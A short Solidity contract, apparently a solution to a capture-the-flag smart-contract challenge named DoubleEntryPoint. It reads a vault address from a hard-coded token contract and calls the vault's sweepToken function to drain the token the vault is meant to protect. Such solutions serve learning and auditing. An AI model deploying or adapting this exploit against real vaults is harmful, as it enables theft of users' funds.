pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface ICryptoVault {
    function sweepToken(IERC20 token) external;
}


contract DoubleEntryPointAttacker {
    function attack() external {
        address vault;
        (bool success, bytes memory data) = address(0x10C6E9530F1C1AF873a391030a1D9E8ed0630D26).call(abi.encodeWithSignature("cryptoVault()"));
        require(success, "Failed to get vault address");
        vault = abi.decode(data, (address));
        ICryptoVault(vault).sweepToken(IERC20(0x10C6E9530F1C1AF873a391030a1D9E8ed0630D26));
    }
}